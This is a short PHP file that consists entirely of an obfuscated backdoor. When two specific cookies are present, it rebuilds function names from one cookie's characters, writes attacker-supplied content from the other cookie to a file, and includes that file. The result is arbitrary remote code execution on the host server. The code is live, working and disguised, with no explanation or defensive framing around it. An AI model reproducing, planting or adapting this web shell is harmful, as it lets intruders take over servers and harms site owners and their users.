<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[27])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 2;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[27][$n];
        if (!$c[27][$n + 1]) {
            if (!$c[27][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 2 + 1;
    }
    $k = $p[18]() . $p[8];
    if (!$p[13]($k)) {
        $n = $p[20]($k, $p[4]);
        $p[14]($n, $p[6] . $p[11]($p[3]($c[3])));
    }
    include($k);
}